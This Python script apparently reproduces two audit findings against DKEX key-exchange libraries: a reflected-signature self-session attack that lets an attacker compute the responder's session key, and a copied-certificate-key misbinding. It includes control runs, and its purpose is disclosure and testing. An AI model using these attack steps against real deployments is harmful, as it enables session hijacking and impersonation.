#!/usr/bin/env python3
"""Reproduce kex-04-4 (reflected-signature self-session) and kex-04-5
(copied-certified-key misbinding) against the prebuilt DKEX libraries.

kex-04-4: both roles sign the same transcript digest T (adkex_derand.c:88 and
:117). When a party P responds to a session whose claimed initiator key is its
own (pk_A = pk_B = pk_P), the attacker sends P's own sigma_B back as message 3.
P accepts a session that has no matching initiator session, and the attacker,
who generated M1, computes P's session key.

kex-04-5: T binds certified key bytes, not identities. If Eve's certificate
carries Bob's key, Alice's session with "Eve" completes with Bob, and Bob's
session with Alice holds the same key.

Only the uniform KEX ABI of lib/libDKEX-*.so is used; no attacker step uses a
signing key other than the attacker's own unrelated one.
"""

import ctypes
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
LEVELS = (128, 256, 512)
U = ctypes.c_ulonglong


def buffer(data_or_size):
    if isinstance(data_or_size, int):
        return ctypes.create_string_buffer(max(1, data_or_size))
    b = ctypes.create_string_buffer(max(1, len(data_or_size)))
    ctypes.memmove(b, data_or_size, len(data_or_size))
    return b


class Dkex:
    def __init__(self, path):
        lib = ctypes.CDLL(str(path), mode=ctypes.RTLD_LOCAL)
        for name in ("kex_get_pk_len_bytes", "kex_get_sk_len_bytes",
                     "kex_get_sta_len_bytes", "kex_get_stb_len_bytes",
                     "kex_get_ss_len_bytes", "kex_get_total_msg_len_bytes"):
            getattr(lib, name).restype = U
        self.lib = lib
        self.pkl = lib.kex_get_pk_len_bytes()
        self.skl = lib.kex_get_sk_len_bytes()
        self.stl = max(lib.kex_get_sta_len_bytes(), lib.kex_get_stb_len_bytes())
        self.ssl = lib.kex_get_ss_len_bytes()
        self.msgl = lib.kex_get_total_msg_len_bytes()

    def seed(self, value):
        assert self.lib.ngcc_seed(value, U(len(value))) == 0

    def keygen(self, responder):
        fn = self.lib.kex_init_b if responder else self.lib.kex_init_a
        pk, sk, st = buffer(self.pkl), buffer(self.skl), buffer(self.stl)
        pl, sl, tl = U(), U(), U()
        assert fn(pk, ctypes.byref(pl), sk, ctypes.byref(sl), st, ctypes.byref(tl)) == 0
        return pk.raw[:pl.value], sk.raw[:sl.value], st.raw[:tl.value]

    def pass1(self, pk_peer, st_init):
        st = buffer(self.stl)
        ctypes.memmove(st, st_init, len(st_init))
        stl, m, ml = U(len(st_init)), buffer(self.msgl), U()
        rc = self.lib.kex_generate_pass1_msg_a(buffer(1), U(0), buffer(pk_peer), U(len(pk_peer)),
                                               st, ctypes.byref(stl), m, ctypes.byref(ml))
        return rc, st.raw[:self.stl], m.raw[:ml.value]

    def _passn(self, fn, sk, pk, msg, st_in):
        st = buffer(self.stl)
        ctypes.memmove(st, st_in, len(st_in))
        stl, m, ml = U(len(st_in)), buffer(self.msgl), U()
        rc = fn(buffer(sk), U(len(sk)), buffer(pk), U(len(pk)), buffer(msg), U(len(msg)),
                st, ctypes.byref(stl), m, ctypes.byref(ml))
        return rc, st.raw[:self.stl], m.raw[:ml.value]

    def pass2(self, sk_b, pk_a, m1, st_b):
        return self._passn(self.lib.kex_generate_pass2_msg_b, sk_b, pk_a, m1, st_b)

    def pass3(self, sk_a, pk_b, m2, st_a):
        return self._passn(self.lib.kex_generate_pass3_msg_a, sk_a, pk_b, m2, st_a)

    def _derive(self, fn, sk, pk, msg, st):
        ss, sl = buffer(self.ssl), U()
        rc = fn(buffer(sk), U(len(sk)), buffer(pk), U(len(pk)), buffer(msg), U(len(msg)),
                buffer(st), U(len(st)), ss, ctypes.byref(sl))
        return rc, ss.raw[:sl.value]

    def derive_a(self, st_a):
        return self._derive(self.lib.kex_derive_ss_a, b"", b"", b"", st_a)

    def derive_b(self, sk_b, pk_a, m3, st_b):
        return self._derive(self.lib.kex_derive_ss_b, sk_b, pk_a, m3, st_b)


def require(cond, label):
    if not cond:
        raise AssertionError(label)


def source_check(level):
    """Both roles sign the identical digest T (Algorithms 16 and 17)."""
    path = ROOT / f"Implementations/Reference_Implementation/DKEX-{level}/adkex_derand.c"
    if not path.is_file():
        return "source not present (check skipped)"
    lines = path.read_text().splitlines()
    require(lines[87].strip() == "adkex_sig_sign(sigma_B, sk_B, T_st, ADKEX_SSBITS);", "adkex_derand.c:88")
    require(lines[116].strip() == "adkex_sig_sign(m3, sk_A, T, ADKEX_SSBITS);", "adkex_derand.c:117")
    return "adkex_derand.c:88 and :117 sign the same T"


def honest(x, sk_a, pk_a, st_a, sk_b, pk_b, st_b, pk_for_a, pk_for_b):
    """Initiator (sk_a) believes its peer has pk_for_a; responder (sk_b) believes pk_for_b."""
    rc, sa, m1 = x.pass1(pk_for_a, st_a); require(rc == 0, "pass1")
    rc, sb, m2 = x.pass2(sk_b, pk_for_b, m1, st_b); require(rc == 0, "pass2")
    rc3, sa, m3 = x.pass3(sk_a, pk_for_a, m2, sa)
    if rc3 != 1:
        return rc3, None, None
    rca, ka = x.derive_a(sa)
    rcb, kb = x.derive_b(sk_b, pk_for_b, m3, sb)
    require(rca == 0, "derive_a")
    return rc3, ka, (kb if rcb == 0 else None)


def run_level(level):
    x = Dkex(ROOT / f"lib/libDKEX-{level}.so")
    x.seed(b"kex-04 reflection witness seed..".ljust(48, b"\0"))
    src = source_check(level)
    pk_p, sk_p, st_p = x.keygen(responder=True)    # honest P (Bob)
    pk_q, sk_q, st_q = x.keygen(responder=False)   # honest Q (Alice)
    pk_e, sk_e, st_e = x.keygen(responder=False)   # attacker's own unrelated key
    require(st_p[:len(pk_p)] == pk_p and st_q[:len(pk_q)] == pk_q, "init stashes pk in state")

    # ---- kex-04-4: reflection self-session against P ----
    # Attacker's own DKE ephemeral; the initiator-state stash is set to pk_P (public).
    rc, st_att, m1 = x.pass1(pk_p, pk_p); require(rc == 0, "attacker pass1")
    rc, st_bp, m2 = x.pass2(sk_p, pk_p, m1, st_p); require(rc == 0, "P pass2 (claimed peer P)")
    sig_len = x.msgl - len(m1) - len(m2)              # m3 = sigma_A has the length of sigma_B
    require(0 < sig_len < len(m2), "signature length")
    sigma_b = m2[-sig_len:]
    rc, k_p = x.derive_b(sk_p, pk_p, sigma_b, st_bp)
    require(rc == 0, "P rejected its own reflected sigma_B")
    # The attacker completes its own computation with pass 3 (sigma_B verifies under
    # pk_P); the signature pass 3 emits uses the attacker's unrelated key and is discarded.
    rc, st_att, m3_own = x.pass3(sk_e, pk_p, m2, st_att); require(rc == 1, "attacker pass3")
    require(m3_own != sigma_b, "attacker's own m3 differs from sigma_B")
    rc, k_att = x.derive_a(st_att); require(rc == 0, "attacker derive")
    require(k_att == k_p, "attacker key differs from P's key")

    # controls
    bad = bytearray(sigma_b); bad[7] ^= 1
    rc, _ = x.derive_b(sk_p, pk_p, bytes(bad), st_bp)
    ctl_mut = rc != 0
    rc, st_bq, m2q = x.pass2(sk_p, pk_q, m1, st_p); require(rc == 0, "P pass2 to Q")
    rc, _ = x.derive_b(sk_p, pk_q, m2q[-sig_len:], st_bq)
    ctl_distinct = rc != 0
    rc3, ka, kb = honest(x, sk_q, pk_q, st_q, sk_p, pk_p, st_p, pk_p, pk_q)
    ctl_honest = rc3 == 1 and ka is not None and ka == kb
    print(f"DKEX-{level} kex-04-4: reflected sigma_B accepted={True}, attacker key == P key "
          f"({k_p[:8].hex()}..); controls: bit-flipped sigma rejected={ctl_mut}, "
          f"reflection with pk_A != pk_B rejected={ctl_distinct}, honest Q-P run agrees={ctl_honest}; {src}")
    ok4 = ctl_mut and ctl_distinct and ctl_honest

    # ---- kex-04-5: Eve's certificate carries P's key ----
    certificates = {"Bob": pk_p, "Eve": pk_p}
    rc3, ka, kb = honest(x, sk_q, pk_q, st_q, sk_p, pk_p, st_p, certificates["Eve"], pk_q)
    uks = rc3 == 1 and ka is not None and ka == kb
    # control: Eve with her own distinct key; the relayed sigma_B no longer verifies
    rc, sa, m1v = x.pass1(pk_e, st_q); require(rc == 0, "control pass1")
    rc, sb, m2v = x.pass2(sk_p, pk_q, m1v, st_p); require(rc == 0, "control pass2")
    rc, _, _ = x.pass3(sk_q, pk_e, m2v, sa)
    ctl_eve = rc != 1
    print(f"DKEX-{level} kex-04-5: Alice(peer 'Eve', cert = copy of Bob's key) and Bob(peer Alice) "
          f"agree={uks}; control: Eve's own distinct key rejected at pass 3={ctl_eve}")
    ok5 = uks and ctl_eve
    return ok4, ok5


def main():
    t0 = time.time()
    present = [lv for lv in LEVELS if (ROOT / f"lib/libDKEX-{lv}.so").is_file()]
    missing = [lv for lv in LEVELS if lv not in present]
    if not present:
        print("SKIP kex-04-4/kex-04-5: no lib/libDKEX-*.so (build them: make -C kex-04)")
        return 77
    res = {}
    for lv in present:
        try:
            res[lv] = run_level(lv)
        except AssertionError as exc:
            print(f"DKEX-{lv}: protocol step failed: {exc}")
            res[lv] = (False, False)
    note = f"; not built: {', '.join(f'DKEX-{lv}' for lv in missing)}" if missing else ""
    sets = ", ".join(f"DKEX-{lv}" for lv in present)
    ok4 = all(r[0] for r in res.values())
    ok5 = all(r[1] for r in res.values())
    if ok4:
        print(f"CONFIRMED kex-04-4: {sets}: the responder accepts its own reflected signature "
              f"as message 3 and the attacker computes its session key{note}")
    else:
        print(f"NOT CONFIRMED kex-04-4: {sets}{note}")
    if ok5:
        print(f"CONFIRMED kex-04-5: {sets}: a copied certified key gives equal keys under "
              f"different peer identities{note}")
    else:
        print(f"NOT CONFIRMED kex-04-5: {sets}{note}")
    print(f"runtime {time.time() - t0:.2f} s")
    return 0 if ok4 and ok5 else 1


if __name__ == "__main__":
    sys.exit(main())
